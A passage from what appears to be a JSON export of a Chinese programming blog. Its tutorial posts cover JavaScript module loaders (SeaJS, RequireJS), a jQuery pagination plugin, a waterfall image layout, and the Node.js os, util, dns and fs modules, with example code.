HTML5之Javascript多线程有讲共享型SharedWebWorker","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"Concurrent.Thread.js","slug":"Concurrent-Thread-js","permalink":"https://github.com/xmoyKING/tags/Concurrent-Thread-js/"},{"name":"webwork","slug":"webwork","permalink":"https://github.com/xmoyKING/tags/webwork/"}]},{"title":"javascript模块化","slug":"js-module","date":"2016-11-07T11:05:34.000Z","updated":"2016-11-07T11:05:34.000Z","comments":true,"path":"2016/11/07/js-module/","link":"","permalink":"https://github.com/xmoyKING/2016/11/07/js-module/","excerpt":"","text":"了解javascript的模块化,以及AMD,CMD的异同, SeaJS, RequireJS的简单介绍和应用 起源于nodejs, 将所有js分块,每一个块标准相同(即接口相同), 用时如同乐高将每一个块组合起来即可. AMD规范AMD是RequireJS对模块化的规范 异步加载,依赖前置,提前执行 定义模块方法: define([&#39;require&#39;,&#39;foo&#39;], function(){ return }) 加载模块方法(依赖前置): require([&#39;foo&#39;, &#39;bar&#39;], function(foo, bar){ }); CMD规范CMD是SeaJS对模块化的规范 同步加载,依赖就近,延迟执行 定义模块使用exports导出define(function(require, exports, module){}),其中module存储当前模块的一些对象 可使用require(modulename)直接引入, 也可使用require.async(modulename, callback)异步引入 除了AMD和CMD规范, 还有CommonJS Modules/2.0 规范 SeaJS入门上手最新版本为3.0，于2014年6月更新，已经很久没更新 目录组织结构:123456js sea.js m1.js m2.js main.jsindex.html 12345678910&lt;script type=\"text/javascript\" src=\"js/sea.js\"&gt;&lt;/script&gt;&lt;script type=\"text/javascript\"&gt; seajs.config(&#123; base: './js/', // 配置模块基本目录 alias: &#123; // 配置别名 jquery: 'jquery.js' &#125; &#125;); seajs.use('main'); //加载入口模块&lt;/script&gt; 123456789101112// main.jsdefine(function (require, exports, module) &#123; // 异步加载 require.async('m2', function(m)&#123; m.do2(); &#125;); // 同步导入; var index = require('m1'); index.fun1();&#125;) 12345678910// m1.jsdefine(function (require, exports, module) &#123; // 通过exports导出某个函数, exports.fun1 = function () &#123; console.log('fun1'); &#125; exports.fun2 = function () &#123; console.log('fun2'); &#125;&#125;); 1234567891011121314// m2.jsdefine(function (require, exports, module) &#123; // 通过module.exports提供整个对象,包括内部的所有函数和变量 // 与上面exports的导出方式不可公用 var multi = &#123;&#125;; // 预先定义导出对象 multi.do1 = function()&#123; console.log('do1'); &#125; multi.do2 = function()&#123; console.log('do2'); &#125; module.exports = multi;&#125;) SeaJS demo代码下载地址 DEMO截图：Chrome下打印执行结果: Chorme下加载文件顺序： RequireJS入门上手RequireJS和SeaJS有相似的地方，但是也有不同之处，但是实现的功能都是一样的，那就是将js模块化,写法和思想上有不同。 目录组织结构:123456js require.js m1.js m2.js main.jsindex.html 1&lt;script type=\"text/javascript\" data-main=\"js/main.js\" src=\"js/require.js\"&gt;&lt;/script&gt; 12345678// main.jsdefine(['require','main'], function (require) &#123; console.log('main'); require(['m1', 'm2'], function(m1, m2)&#123; console.log(m1); console.log(m2); &#125;);&#125;); 1234567// m1.jsdefine(['require','m1'], function (require) &#123; console.log('m1'); return function()&#123; console.log('m1 return'); &#125;&#125;); 12345678// m2.jsdefine(['require','m2'], function (require) &#123; console.log('m2'); var init = function()&#123; console.log('m2 init'); &#125; return init;&#125;); RequireJS demo代码下载地址 执行结果截图：","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"module","slug":"module","permalink":"https://github.com/xmoyKING/tags/module/"}]},{"title":"jQuery实现分页","slug":"jquery-pagination","date":"2016-11-05T08:23:49.000Z","updated":"2016-11-05T08:23:49.000Z","comments":true,"path":"2016/11/05/jquery-pagination/","link":"","permalink":"https://github.com/xmoyKING/2016/11/05/jquery-pagination/","excerpt":"","text":"使用jquery实现前端分页插件，只要导入css和js，加上对应的url接口即可自动分页， 12&lt;!-- dom结构--&gt;&lt;nav class=\"pagination\"&gt;&lt;/nav&gt; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138//分页插件 jquery.page.js(function($)&#123; var ms = &#123; init:function(obj, args)&#123; return (function()&#123; ms.fillHtml(obj,args); ms.bindEvent(obj,args); &#125;)(); &#125;, //填充html fillHtml:function(obj,args)&#123; return (function()&#123; obj.empty(); args.pageCount = Math.ceil(args.pageCount); //上一页，中间页码容器, 第一页始终存在 obj.append('&lt;a href=\"javascript:;\" class=\"prevPage\"&gt;上一页&lt;/a&gt;\\ &lt;span class=\"pages tc\"&gt;&lt;a class=\"firstPage\" href=\"javascript:;\"&gt;&lt;span&gt;1&lt;/span&gt;&lt;/a&gt;&lt;/span&gt;'); //分页后部按钮 obj.append( '&lt;a href=\"javascript:;\" class=\"nextPage\"&gt;下一页&lt;/a&gt;\\ &lt;span class=\"pageNum\"&gt;共'+args.pageCount+'页&lt;/span&gt;\\ &lt;label&gt;跳转到第&lt;input type=\"text\" value=\"1\"&gt;&lt;/input&gt;页&lt;/label&gt;\\ &lt;span class=\"confirmbtn\"&gt;确定&lt;/span&gt;\\ '); var i = 2; //迭代页数 if(args.pageCount &lt;= 7)&#123; for(; i &lt;= args.pageCount; ++i)&#123; if( i == args.current)&#123; obj.find('.pages').append('&lt;a href=\"javascript:;\" class=\"current disabled\"&gt;&lt;span&gt;'+ i +'&lt;/span&gt;&lt;/a&gt;'); &#125;else&#123; obj.find('.pages').append('&lt;a href=\"javascript:;\"&gt;&lt;span&gt;'+ i +'&lt;/span&gt;&lt;/a&gt;'); &#125; &#125; &#125;else&#123; //页数大于7页 if(args.current &lt;= 4)&#123; // 当前页在前4页 for(; i &lt;= 7; ++i)&#123; if( i == args.current)&#123; obj.find('.pages').append('&lt;a href=\"javascript:;\" class=\"current disabled\"&gt;&lt;span&gt;'+ i +'&lt;/span&gt;&lt;/a&gt;'); &#125;else&#123; obj.find('.pages').append('&lt;a href=\"javascript:;\"&gt;&lt;span&gt;'+ i +'&lt;/span&gt;&lt;/a&gt;'); &#125; &#125; obj.find('.pages').append('&lt;a href=\"javascript:;\" class=\"disabled\"&gt;&lt;span &gt;...&lt;/span&gt;&lt;/a&gt;'); &#125;else if( args.current &gt;= args.pageCount - 3 )&#123; // 当前页在最后4页 i = args.pageCount - 5; obj.find('.pages').append('&lt;a href=\"javascript:;\" class=\"disabled\"&gt;&lt;span &gt;...&lt;/span&gt;&lt;/a&gt;'); for(; i &lt;= args.pageCount; ++i)&#123; if( i == args.current)&#123; obj.find('.pages').append('&lt;a href=\"javascript:;\" class=\"current disabled\"&gt;&lt;span&gt;'+ i +'&lt;/span&gt;&lt;/a&gt;'); &#125;else&#123; obj.find('.pages').append('&lt;a href=\"javascript:;\"&gt;&lt;span&gt;'+ i +'&lt;/span&gt;&lt;/a&gt;'); &#125; &#125; &#125;else&#123; // 当前页其他情况 i = args.current - 2; obj.find('.pages').append('&lt;a href=\"javascript:;\" class=\"disabled\"&gt;&lt;span &gt;...&lt;/span&gt;&lt;/a&gt;'); for(; i &lt;= args.current + 2; ++i)&#123; if( i == args.current)&#123; obj.find('.pages').append('&lt;a href=\"javascript:;\" class=\"current disabled\"&gt;&lt;span&gt;'+ i +'&lt;/span&gt;&lt;/a&gt;'); &#125;else&#123; obj.find('.pages').append('&lt;a href=\"javascript:;\"&gt;&lt;span&gt;'+ i +'&lt;/span&gt;&lt;/a&gt;'); &#125; &#125; obj.find('.pages').append('&lt;a href=\"javascript:;\" class=\"disabled\"&gt;&lt;span &gt;...&lt;/span&gt;&lt;/a&gt;'); &#125; &#125; if(args.current == 1)&#123; obj.find('.prevPage').addClass('disabled').end() .find('.firstPage').addClass('current disabled'); &#125; if(args.current == args.pageCount)&#123; obj.find('.nextPage').addClass('disabled'); &#125; &#125;)(); &#125;, //绑定事件 bindEvent:function(obj,args)&#123; return (function()&#123; obj.off(\"click\").on(\"click\",\".pages&gt;a:not(.disabled)\",function()&#123; var current = parseInt($(this).text()); // ms.fillHtml(obj,&#123;\"current\":current,\"pageCount\":args.pageCount&#125;); if(typeof(args.backFn)==\"function\")&#123; args.backFn(current); &#125; &#125;); obj.on(\"click\",\"a.prevPage:not(.disabled)\",function()&#123; //上一页 if(typeof(args.backFn)==\"function\")&#123; args.backFn(args.current-1); &#125; &#125;).on(\"click\",\"a.nextPage:not(.disabled)\",function()&#123; //下一页 if(typeof(args.backFn)==\"function\")&#123; args.backFn(args.current+1); &#125; &#125;).on(\"click\",\"a.firstPage\",function()&#123; //首页 var current = 1; if(typeof(args.backFn)==\"function\")&#123; args.backFn(current); &#125; &#125;).on('click','.confirmbtn',function()&#123; //直接输入跳转 if(typeof(args.backFn)==\"function\")&#123; var p = parseInt(obj.find('[type=text]').val()); if(p &lt;= args.pageCount) args.backFn(p); &#125; &#125;); // 禁止输入非正整数 obj.find('[type=text]').on('keyup',function () &#123; $(this).val( $(this).val().replace(/[^\\d]/g, '') ); &#125;) //尾页 // obj.on(\"click\",\"a.lastPage\",function()&#123; // var current = args.pageCount; // // ms.fillHtml(obj,&#123;\"current\":args.pageCount,\"pageCount\":args.pageCount&#125;); // if(typeof(args.backFn)==\"function\")&#123; // args.backFn(current); // &#125; // &#125;); &#125;)(); &#125; &#125;; $.fn.createPage = function(options)&#123; var args = $.extend(&#123; pageCount : 10, current : 1, backFn : function()&#123;&#125; &#125;,options); ms.init(this,args); &#125;&#125;)(jQuery); 12345678910111213141516171819202122232425262728293031/** * 封装分页控件,公用 * @param data ajax请求数据 * @param params ajax请求参数 * @param callback 点击分页回调 * @param ele 目标元素 * * 渲染分页控件 * setPagination(res, classDetail.getNote_params, function (params) &#123; * getJson(\"POST\",\"json\",classDetail.getNote_url,params,classDetail.getNoteCallback); * &#125;,\".ele\"); */function setPagination(data, params, callback, ele) &#123; var $pagination = ($(ele).length &gt; 0) ? $(ele) : $(\"nav.pagination\"); if (parseInt(data.num) &lt;= parseInt(params.pagesize) || data.list.length == 0) &#123; $pagination.hide(); &#125; else &#123; // 分页激活 $pagination.show().createPage(&#123; pageCount: data.num / params.pagesize, current: parseInt(data.page), backFn: function(p) &#123; //单击回调方法，p是当前页码 params.page = p; callback(params); &#125; &#125;); &#125;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455// 使用var list = &#123; \"url\" : \"/job/company/position/getlist\", \"param\": &#123; \"job_name\": \"\", // 职务名称 \"job_type_id\":\"\", // 职务类型 \"order\": \"\", //排序 \"page\" : \"1\", //当前页数 \"pagesize\" : \"3\", // 每页条数 &#125;, init: function () &#123; getJson(\"POST\",\"json\",this.url,this.param,this.callback) &#125;, callback: function (data) &#123; var res = data.data, html = \"\"; $.each(res.list,function (i, n) &#123; function tags(tags) &#123; var li = '&lt;span&gt;&lt;%name%&gt;&lt;/span&gt;'; var lis = ''; for(var i = 0; i &lt; tags.length &amp;&amp; i &lt; 4; ++i)&#123; lis+= li.replace('&lt;%name%&gt;',tags[i]); &#125; return lis; &#125; var temp = '&lt;li&gt;&lt;a href=\"#\"&gt;&lt;h3 class=\"title pr\"&gt;&lt;%job_name%&gt;&lt;/h3&gt;\\ &lt;p class=\"features\"&gt;&lt;span&gt;&lt;%job_location%&gt;&lt;/span&gt;&lt;span&gt;学历&lt;%job_edu%&gt;&lt;/span&gt;&lt;%job_tags%&gt;&lt;/p&gt;\\ &lt;p class=\"desc\"&gt;&lt;%job_desc%&gt;&lt;/p&gt;&lt;/a&gt;&lt;/li&gt;'; temp = temp.replace('&lt;%job_name%&gt;',n.job_name) .replace('&lt;%job_location%&gt;',n.job_location) .replace('&lt;%job_edu%&gt;',n.job_edu) .replace('&lt;%job_desc%&gt;', $(n.job_desc).text()) .replace('&lt;%job_tags%&gt;', tags( JSON.parse(n.job_tags))); html += temp; &#125;); $('.postList').html(html); // 分页激活 setPagination(res, list.param, function () &#123; list.init(); //每次点击页码都会重新加载数据后激活分页 &#125;); // 返回顶部 $('body,html').animate(&#123; scrollTop: 0 &#125;, 800); &#125;&#125;;// 初始化list.init(); 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081/* 分页样式 pagination.css */nav.pagination &#123; line-height: 44px; word-wrap: normal; white-space: nowrap; color: #676767; font-size: 12px; background-color: #fff; border-radius: 6px; margin-bottom: 50px;&#125;nav.pagination .prevPage&#123; padding: 0 27px 0 40px;&#125;nav.pagination .nextPage&#123; padding: 0 33px 0 27px;&#125;nav.pagination a&#123; display: inline-block;&#125;nav.pagination .pages&#123; display: inline-block; width: 261px;&#125;nav.pagination .pages&gt;a&#123; width: 30px; color: #cbcbcb;&#125;nav.pagination .pages&gt;a:hover&#123; color: #676767;&#125;nav.pagination .pages&gt;a.current&gt;span&#123; cursor: default; position: relative; text-align: center; display: inline-block; width: 12px; color: #676767;&#125;nav.pagination .pages&gt;a.current&gt;span::after&#123; display: block; content: ''; position: absolute; width: 15px; height: 2px; bottom: 0px; left: -1.5px; background-color: #35cc91;&#125;nav.pagination a.disabled,nav.pagination a.disabled:hover,nav.pagination a.disabled:active &#123; cursor: default; color: #cbcbcb; -webkit-user-select: none; -ms-user-select: none; -moz-user-select: none; user-select: none;&#125;nav.pagination .pageNum&#123; margin: 0 9px 0 17px;&#125;nav.pagination [type=\"text\"]&#123; text-align: center; margin: 0 6px; width: 40px; height: 24px; box-sizing: border-box; border-radius: 2px; border: 1px solid #d1d1d1;&#125;nav.pagination .confirmbtn&#123; cursor: pointer; margin: 0 20px 0 12px; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none;&#125;","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"jquery","slug":"jquery","permalink":"https://github.com/xmoyKING/tags/jquery/"},{"name":"pagination","slug":"pagination","permalink":"https://github.com/xmoyKING/tags/pagination/"}]},{"title":"jQuery实现图片瀑布流展示","slug":"jquery-waterfall","date":"2016-11-01T08:21:34.000Z","updated":"2016-11-01T08:21:34.000Z","comments":true,"path":"2016/11/01/jquery-waterfall/","link":"","permalink":"https://github.com/xmoyKING/2016/11/01/jquery-waterfall/","excerpt":"","text":"首先给出一个瀑布流的基本要求所有图片限宽，高度自适应，横向排列，第二排第一张自动放在在第一排的最短处。 HTML结构：1234567891011121314151617181920&lt;div class=\"container\"&gt; &lt;div class=\"box\"&gt; &lt;div class=\"content\"&gt; &lt;img src=\"1.jpg\"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"box\"&gt; &lt;div class=\"content\"&gt; &lt;img src=\"2.jpg\"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"box\"&gt; &lt;div class=\"content\"&gt; &lt;img src=\"3.jpg\"&gt; &lt;/div&gt; &lt;/div&gt; ...&lt;/div&gt; 基本CSS样式:12345678910111213.box&#123; position: relative; float:left;&#125;.content&#123; padding: 10px; border: 1px solid #ccc; box-shadow: 0 0 5px #ccc;&#125;.content&gt;img&#123; with: 190px; height: auto;&#125; jquery实现摆放逻辑：1234567891011121314151617181920212223242526272829303132333435$(document).ready(function()&#123; $(window).on('load', function()&#123; imgLocation(); &#125;);&#125;);// 计算所有图片的位置function imgLocation()&#123; var box = $('.box'); // 获取所有图片容器 var boxWidth = box.eq(0).width(); // 获取图片容器宽度（不是图片宽度） var num = Math.floor($(window).width/boxWidth); // 计算当前窗口横排摆放图片数量 var boxArr = []; // 容器列数数组，每个数用于保存当前列的图片总高度 // 对每一个容器遍历 box.each(function(i, e)&#123; var boxHeight = box.eq(i).height(); // 获取当前容器的高度 if(i &lt; num)&#123; // 保存第一排的容器高度到boxArr中 boxArr[i] = boxHeight; &#125;else&#123; var minBoxHeight = Math.min.apply(null, boxArr); // 从所有列中找到高度最小的 var minBoxIndex = $.inArray(minBoxHeight, boxArr); // 得到最小高度所在的索引 // 设置当前容器的位置，使用绝对定位，高为最小列高度，左为最小列左边位置 $(e).css(&#123; position: 'absolute', top: minBoxHeight, left: box.eq(minBoxIndex).position().left &#125;); // 更新添加图片后的当前列（最小高度列）的高度，加上本次容器的高度 boxArr[minBoxIndex] += box.eq(i).height(); &#125; &#125;)&#125; 滚动加载：监听window的scroll事件1234567891011121314151617181920212223// 判断滚动位置，是否需要加载function scrollSide()&#123; var box = $('.box'); // 获取最后一个box容器的位置（其实是设定一个加载图片的基准线） var documentHeight = $(document).height(); var lastboxHeight = box.last().get(0).offsetTop + Math.floor(box.last().height()/2); var scrollHeight = $(window).scrollTop(); // 获取滚动条高度 // 返回true/false return (lastboxHeight &lt; scrollHeight + documentHeight) ? true : false;&#125;// 模拟获取到的img图片数据var imgdata = &#123;&#125; window.onscroll = function()&#123; if(scrollSide())&#123; // 对图片数据遍历，构造图片html字符串 $.each(imgdata.data, function (i, e) &#123; // ... &#125;); // 然后统一加载至dom内即可（可减少dom操作次数） // 最后对所有图片进行位置更新即可 &#125;&#125;","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"jquery","slug":"jquery","permalink":"https://github.com/xmoyKING/tags/jquery/"},{"name":"waterfall","slug":"waterfall","permalink":"https://github.com/xmoyKING/tags/waterfall/"}]},{"title":"Nodejs-其他模块","slug":"nodejs-others","date":"2016-10-28T11:17:16.000Z","updated":"2016-10-28T11:17:16.000Z","comments":true,"path":"2016/10/28/nodejs-others/","link":"","permalink":"https://github.com/xmoyKING/2016/10/28/nodejs-others/","excerpt":"","text":"本文记录Node的一些其他内置模块，比如os模块能获取操作系统方面的信息，util提供各种功能，如同步输出、字符串格式化、继承，dns模块能查找DNS或反向查找 os模块os模块提供了的获取操作系统信息的方法，参考os (操作系统) os常用方法os.EOL 一个字符串常量,定义操作系统相关的行末标志: \\n 在 POSIX 系统上 \\r\\n 在 Windows系统上 os.arch() 方法返回一个字符串, 表明Node.js 二进制编译 所用的 操作系统CPU架构.os.constantsos.cpus() 方法返回一个对象数组, 包含安装的每个CPU/CPU核的信息.os.endianness() 方法返回一个字符串,表明Node.js二进制编译环境的字节顺序. ‘BE’ 大端模式 ‘LE’ 小端模式os.freemem() 方法以整数的形式回空闲系统内存 的字节数.os.homedir()os.hostname() 方法以字符串的形式返回操作系统的主机名.os.loadavg()os.networkInterfaces() 方法返回一个对象,包含只有被赋予网络地址的网络接口.os.platform() 方法返回一个字符串, 指定Node.js编译时的操作系统平台os.release() 方法返回一个字符串, 指定操作系统的发行版.os.tmpdir() 方法返回一个字符串, 表明操作系统的 默认临时文件目录.os.totalmem() 方法以整数的形式返回所有系统内存的字节数.os.type() 方法返回一个字符串,表明操作系统的名字, 由uname(3)返回.举个例子, ‘Linux’ 在 Linux系统上, ‘Darwin’ 在 OS X 系统上,’Windows_NT’ 在 Windows系统上.os.uptime() 方法在几秒内返回操作系统的上线时间.os.userInfo([options]) OS 常量信号常量错误常量 POSIX 错误常量 Windows 系统特有的错误常量libuv 常量 util模块util模块是一个专用用于提供大量使用功能的”工具包”模块 格式化字符串在处理字符串数据时，通常需要格式化字符串，util模块提供的format函数接受一个格式化字符串作为第一个参数，并返回格式化后的字符串。format参数可以包含占位符，1234%s 表示字符串%d 表示数值，整数或浮点数%j 表示JSON，或可转换为字符串的对象% 若%后为空，则不作为占位符 当参数比占位符少时，多余的占位符不会被替换而是直接输出123const util = require('util');var s = util.format('%s = %s', 'item'); console.log(s); // item = %s 当参数多余占位符时，多余的参数被转换为字符串，然后用空格分隔12var s = util.format('%s = %s', 'item','aaaa', 'more', 'bbb'); console.log(s); // item = aaaa more bbb 若第一个参数不是格式字符串，则会自动转换为字符串，用空格分隔12var s = util.format(1, 2, 3, 'more', 'bbb'); console.log(s); // 1 2 3 'more' 'bbb' 检查对象类型使用instanceof运算符，比较对象的类型，返回true或false，1console.log([1,2,3] instanceof Array); // true util提供了isArray，isRegExp，isDate，isError等方便的方法 同步写入输出流同步写数据到stdout和stderr意味着进程保持阻塞，直到数据写入完成。1234util.debug(string); // 将string写入stderrutil.error([……]); // 接受多个参数，并写入stderr 如 util.error(errorCode, 'errorname');util.puts([……]); // 接受多个参数，将每一个参数都转换为字符串，然后写入stdoututil.log(string); // 将string以及时间戳写入stdout如 util.log('msg');输出 28 Apr 21:40:39 - msg 将JS对象转换为字符串util.inspect能检查一个对象，然后返回该对象的字符串表示形式1uitl.inspect(object, [options]); options对象可以控制字符串格式化，比如showHidden: 将该对象的不可枚举属性也转换为字符串，默认falsedepth: 当格式化属性也是对象时，限制遍历的深度，默认为2，可以防止无限循环并防止复杂对象占用大量CPU资源，若为null，则无限制递归colors：当设置为true时，使用ANSI颜色样式，默认falsecustomInspect：默认true，当设置为false时，被检测的对象定义的任何自定义inspect方法都不会被调用。（即可以手动覆盖inspect方法）比如：123456const util = require('util');var obj = &#123;first: 'king', last: 'mine'&#125;;obj.inspect = function(depth)&#123; return '&#123;name:\"'+ this.first +' '+ this.last +'\"&#125;';&#125;;console.log(util.inspect(obj)); // &#123;name:\"king mine\"&#125; 继承util.inherits方法能创建一个对象，可以指定继承另一个对象的原型方法。1util.inherits(constructor, superConstructor); 可以通过 constructor.super_ 属性从自定义对象的构造函数访问superConstructor 创建一个继承events.EventEmitter对象构造函数的Writable流，示例如下：123456789101112131415161718192021const util = require('util');const events = require('events');function Writer()&#123; events.EventEmitter.call(this);&#125;util.inherits(Writer, events.EventEmitter);Writer.prototype.write = function(data)&#123; this.emit('data', data);&#125;;var w = new Writer();console.log(w instanceof events.EventEmitter);console.log(Writer.super_ === events.EventEmitter);w.on('data', function (data) &#123; console.log('Data: ' + data);&#125;);w.write('some data!'); 输出：truetrueData: some data! dns模块dns模块能帮助解析DNS域名，查找域，或做反向查找。1234567891011const dns = require('dns');console.log('resolving www.baidu.com ……');dns.resolve4('www.baidu.com',function(err, address)&#123; console.log('ipv4 addresses: '+ JSON.stringify(address, false, ' ')); address.forEach(function (addr) &#123; dns.reverse(addr, function (err, domains) &#123; console.log('Reverse for ' + addr + ': ' + JSON.stringify(domains)); &#125;); &#125;);&#125;); 输出：resolving www.baidu.com ……ipv4 addresses: [ “119.75.217.109”, “119.75.218.70”]Reverse for 119.75.217.109: undefinedReverse for 119.75.218.70: undefined","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"https://github.com/xmoyKING/categories/Nodejs/"}],"tags":[{"name":"nodejs","slug":"nodejs","permalink":"https://github.com/xmoyKING/tags/nodejs/"},{"name":"os","slug":"os","permalink":"https://github.com/xmoyKING/tags/os/"},{"name":"util","slug":"util","permalink":"https://github.com/xmoyKING/tags/util/"}]},{"title":"Nodejs-文件系统","slug":"nodejs-fs","date":"2016-10-28T02:32:45.000Z","updated":"2016-10-28T02:32:45.000Z","comments":true,"path":"2016/10/28/nodejs-fs/","link":"","permalink":"https://github.com/xmoyKING/2016/10/28/nodejs-fs/","excerpt":"","text":"参考自:Node.js 文档 Nodejs提供的fs模块几乎都有两个版本，一个同步版本，一个异步版本，比如异步的write()和同步的writeSync(), 虽然这两个方法在底层功能上是一致的，但这两个版本在运用时有比较大的区别，最好不要混用。 异步和同步调用的区别： 异步调用需要回调函数做为参数，回调函数在文件系统的请求完成时被调用，并通过第一个参数为错误对象 异步调用自动处理异常，若发生异常，就将错误对象作为第一个参数传递，否则第一个参数为null。而同步调用中处理异常需要try/catch语句 同步调用立即运行，且直到结束前会阻塞主线程。异步调用则被放在事件队列中，且执行后返回主线程（真正的执行其实是在事件循环中被提取出时才执行） 大多数语言的文件系统打开文件都提供了好几种读写模式，在node中也是这样：1234// 异步打开一个文件，需要指定回调函数fs.open(path, flags, [mode], callback);// 同步打开一个文件fs.openSync(path, flags, [mode]); 这里的flags即指定读写模式‘r’ - 以读取模式打开文件。如果文件不存在则发生异常。 ‘r+’ - 以读写模式打开文件。如果文件不存在则发生异常。 ‘rs+’ - 以同步读写模式打开文件。命令操作系统绕过本地文件系统缓存。 这对 NFS 挂载模式下打开文件很有用，因为它可以让你跳过潜在的旧本地缓存。 它对 I/O 的性能有明显的影响，所以除非需要，否则不要使用此标志。 注意，这不会使 fs.open() 进入同步阻塞调用。 如果那是你想要的，则应该使用 fs.openSync()。 ‘w’ - 以写入模式打开文件。文件会被创建（如果文件不存在）或截断（如果文件存在）。 ‘wx’ - 类似 ‘w’，但如果 path 存在，则失败。 ‘w+’ - 以读写模式打开文件。文件会被创建（如果文件不存在）或截断（如果文件存在）。 ‘wx+’ - 类似 ‘w+’，但如果 path 存在，则失败。 ‘a’ - 以追加模式打开文件。如果文件不存在，则会被创建。 ‘ax’ - 类似于 ‘a’，但如果 path 存在，则失败。 ‘a+’ - 以读取和追加模式打开文件。如果文件不存在，则会被创建。 ‘ax+’ - 类似于 ‘a+’，但如果 path 存在，则失败。 mode选项只有在创建文件的时候才有效，默认为0666，表示可读写，类似linux的文件系统权限模式。 一个文件被打开后需要关闭，使系统将更改的内容刷新到磁盘并释放对文件的锁，可以通过文件描述符关闭文件，在异步关闭的情况下，还需要传入回调函数。123// fd 为文件描述符，是打开文件后返回的值fs.close(fd, callback);fs.closeSync(fd); 打开并关闭的异步和同步的例子：12345678fs.open('file','w',function(err, fd)&#123; if(!err)&#123; fs.close(fd); &#125;&#125;);var fd = fs.openSync('file', 'w');fs.closeSync(fd); 写入文件fs模块提供了4种方式将数据写入文件，可以在一个程序中，将数据写入文件，同步/异步/Writable流等，输入对象为String或Buffer。 简单写入写入文件最简单的方式为writeFile(), 将一个字符串或缓冲区的所有内容写入文件12fs.writeFile(path, data, [otpions], callback);fs.writeFileSync(path, data, [otpions]); path为写入文件的路径，可以是相对或绝对路径；data为写入文件的string或buffer对象；options为可选对象，包含定义字符串编码，以及打开文件时使用的模式和标志encoding，mode和flag属性。 12345678910111213141516var fs =require('fs');var config = &#123; maxFiles: 20, maxConnections: 15, rootPath: '/webroot'&#125;;var configTxt = JSON.stringify(config);var options = &#123;encoding: 'utf8', flag:'w'&#125;;fs.writeFile('config.txt', configTxt, options, function(err)&#123; if(err)&#123; console.error(err); &#125;else&#123; console.log('Config saved'); &#125;&#125;) 同步写入需要先用openSync打开文件并获取文件描述符，然后使用writeSync写入文件。1fs.writeSync(fd, data, offset, length, position); offset指定data参数中开始的索引，若从当前索引开始应为null，length指定写入的字节数，null表示写到数据缓冲区的末尾，position指定在文件中开始写入的位置，null为当前位置。 123456789var fs = require('fs');var vals = ['carrots', 'celery', 'olives'];var fd = fs.oepnSync('val.txt', 'w');while(vals.length)&#123; val = vals.pop() + ' '; var bytes = fs.writeSync(fd, val, null, null, null); //返回写入的字节数 console.log('wrote %s %d bytes', val, bytes);&#125;fs.closeSync(fd); 异步写入1fs.write(fd, data, offset, length, position, callback); callback接受两个参数，error和bytes， 流式写入写入大量数据时，最好使用流，把文件作为一个Writable流打开，可以使用pipe方法与Readable流链接。将数据异步写入文件，需要先创建一个Writable对象1fs.createWriteStream(path, [options]); 一旦打开Writable文件流，就可以使用标准的流式write(buffer)写入，当完成后，使用end()方法关闭流,这会触发close事件。12345678910111213var fs = require('fs');var garins = ['wheat', 'rice', 'oats'];var options = &#123;encoding: 'utf8', flag: 'w'&#125;;var fileWriteStream = fs.createWriteStream('grains.txt', options);fileWriteStream.on('close', function()&#123; console.log('file closed');&#125;);while(grains.length)&#123; var data = grains.pop()+' '; fileWriteStream.write(data); console.log('Wrote: %s', data);&#125;fileWriteStream.end(); 读取文件同写入文件一样，读取文件也有4种 简单读取直接使用readFile和readFileSync即可 同步读取1fs.readSync(fd, buffer, offset, length, position); buffer替代data对象，作为读入数据的存储对象。 异步读取1fs.read(fd, buffer, offset, length, position, callback); callback函数的参数有三个，error、btyes和buf，使用示例如下：12345678910111213141516171819var fs = require('fs');function readFruit(fd, fruits)&#123; var buf = new Buffer(5); buf.fill(); fs.read(fd, buf, 0, 5, null, function(err, bytes, data)&#123; if(bytes &gt; 0)&#123; console.log('read %d bytes', bytes); fruits += data; readFruit(fd, fruits); &#125;else&#123; fs.close(fd); console.log('Fruits: %s', fruits); &#125; &#125;);&#125;fs.open('fruit.txt','r',function(err, fd)&#123; readFruit(fd, ''); // 初始时传入fruits为空字符串&#125;) 流读取文件读取大量数据时最好使用流式读取，将文件作为Readable流打开。步骤同流写入相同12345678910var fs = require('fs');var options = &#123;encoding: 'utf8', flag: 'r'&#125;;var fileReadStream = fs.createWriteStream('grains.txt', options);fileReadStream.on('data', function(chunk)&#123; console.log('grains: %s', chunk); console.log('grains length: %d', chunk.length);&#125;);fileReadStream.on('close', function()&#123; console.log('file closed');&#125;); 其他文件系统功能 检测文件是否存在/获取文件信息 使用stat方法，返回一个stats对象，有如下属性和方法： 12345678910111213141516171819202122232425// 方法stats.isFile() // 是否为文件stats.isDirectory() // 是否为目录stats.isBlockDevice() // 是否为块设备stats.isCharacterDevice() stats.isSymbolicLink() (仅对 fs.lstat() 有效)stats.isFIFO()stats.isSocket()// 属性&#123; dev: 2114, // 文件所在设备ID ino: 48064969, mode: 33188, // 访问模式 nlink: 1, uid: 85, gid: 100, rdev: 0, size: 527, // 文件字节数 blksize: 4096, // 存储文件的块的大小，字节为单位 blocks: 8, // 占用的磁盘的块的数目 atime: Mon, 10 Oct 2011 23:24:11 GMT, // 上次访问文件的时间 mtime: Mon, 10 Oct 2011 23:24:11 GMT, // 最后修改的时间 ctime: Mon, 10 Oct 2011 23:24:11 GMT, // 创建时间 birthtime: Mon, 10 Oct 2011 23:24:11 GMT&#125; 读取目录中的文件列表 